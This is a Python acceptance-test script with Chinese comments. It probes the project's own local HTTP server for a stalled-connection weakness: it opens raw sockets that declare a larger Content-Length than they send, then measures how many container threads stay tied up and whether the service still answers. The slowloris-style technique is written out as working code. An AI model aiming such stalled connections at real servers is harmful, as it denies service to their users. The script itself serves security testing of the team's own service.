"""CLOUD-001 攻击实验：声明 Content-Length 大于实发字节时，服务端是否无限占用线程。

背景：`deploy/server.py` 用 `size = int(self.headers.get("Content-Length", "-1"))` 取长度后
`self.rfile.read(size)` 读取。若客户端声明 100 字节却只发 5 字节并停住，读操作会阻塞；
`ThreadingHTTPServer` 每连接一线程且未设置 socket 超时，因此每个这样的连接都会**永久占用一个线程**。

本脚本用原始 socket（不补头）复现，并直接读容器内 `PID 1` 的线程数来量化占用，
同时确认服务本身仍能响应（说明是"每连接挂死"而非整机崩溃）。

用法：
    python tests/acceptance/cloud-001/stall_probe.py <base_url> <container_name> <out_json> [hold_seconds]
"""

import json
import socket
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]


def thread_count(container):
    try:
        out = subprocess.check_output(
            ["docker", "exec", container, "sh", "-c", "ls /proc/1/task | wc -l"],
            stderr=subprocess.STDOUT, timeout=20)
        return int(out.decode().strip())
    except Exception as err:
        return f"unavailable: {type(err).__name__}: {err}"


def healthz(base):
    try:
        with urllib.request.urlopen(base + "/healthz", timeout=5) as resp:
            return resp.status
    except Exception as err:
        return f"{type(err).__name__}: {err}"


def open_stalled(host, port, declared=100, actual=b"short"):
    sock = socket.create_connection((host, port), timeout=10)
    sock.sendall(b"POST /validate HTTP/1.0\r\nHost: 127.0.0.1\r\n"
                 b"Content-Length: %d\r\n\r\n" % declared + actual)
    return sock


def main():
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18000"
    container = sys.argv[2] if len(sys.argv) > 2 else "gw-qa"
    out_path = Path(sys.argv[3]) if len(sys.argv) > 3 else ROOT / "docs/test-reports/cloud-001/evidence/stall-probe.json"
    hold = float(sys.argv[4]) if len(sys.argv) > 4 else 45.0
    host, port = "127.0.0.1", int(base.rsplit(":", 1)[-1])
    trace = []

    baseline = thread_count(container)
    trace.append({"step": "baseline", "threads": baseline, "healthz": healthz(base)})

    # 单个停滞连接：观察是否在 hold 秒内始终没有任何响应、也不被对端关闭
    single = open_stalled(host, port)
    started = time.monotonic()
    responses = []
    while time.monotonic() - started < hold:
        time.sleep(5)
        single.settimeout(0.05)
        try:
            data = single.recv(4096)
            responses.append({"t": round(time.monotonic() - started, 1),
                              "data": data.decode("utf-8", "replace")[:200] if data else "<closed by peer>"})
            break
        except socket.timeout:
            pass
        except OSError as err:
            responses.append({"t": round(time.monotonic() - started, 1), "error": f"{type(err).__name__}: {err}"})
            break
        finally:
            single.settimeout(10)
    single_waited = round(time.monotonic() - started, 1)
    trace.append({"step": "single_stalled_connection", "waited_seconds": single_waited,
                  "any_response": responses, "threads": thread_count(container), "healthz": healthz(base)})

    # 批量停滞连接：线程数是否随连接数线性增长且不回收
    socks = []
    for _ in range(8):
        try:
            socks.append(open_stalled(host, port))
        except OSError:
            break
    time.sleep(3)
    during = {"opened_stalled_sockets": len(socks), "threads": thread_count(container),
              "healthz": healthz(base)}
    trace.append({"step": "after_8_stalled", **during})

    # 再等一轮，确认线程不会因为"超时"自行回收
    time.sleep(10)
    trace.append({"step": "after_10_more_seconds", "threads": thread_count(container), "healthz": healthz(base)})

    for sock in socks:
        sock.close()
    single.close()
    time.sleep(3)
    trace.append({"step": "after_client_close", "threads": thread_count(container), "healthz": healthz(base)})

    base_threads = baseline if isinstance(baseline, int) else None
    during_threads = during["threads"] if isinstance(during["threads"], int) else None
    doc = {
        "suite": "CLOUD-001 攻击实验：停滞连接是否无限占用线程",
        "container": container,
        "base_url": base,
        "declared_vs_actual": "Content-Length: 100，实际只发 5 字节后停住",
        "hold_seconds": hold,
        "verdict": {
            "server_blocked_indefinitely": not responses,
            "thread_growth": (during_threads - base_threads) if (base_threads is not None and during_threads is not None) else None,
            "threads_reclaimed_after_client_close": None,
            "service_still_responsive": during["healthz"] == 200,
        },
        "trace": trace,
    }
    if isinstance(trace[-1]["threads"], int) and base_threads is not None:
        doc["verdict"]["threads_reclaimed_after_client_close"] = trace[-1]["threads"] <= base_threads + 1

    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(doc, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(json.dumps(doc["verdict"], ensure_ascii=False, indent=2))
    print("evidence:", out_path)
    return 0


if __name__ == "__main__":
    sys.exit(main())
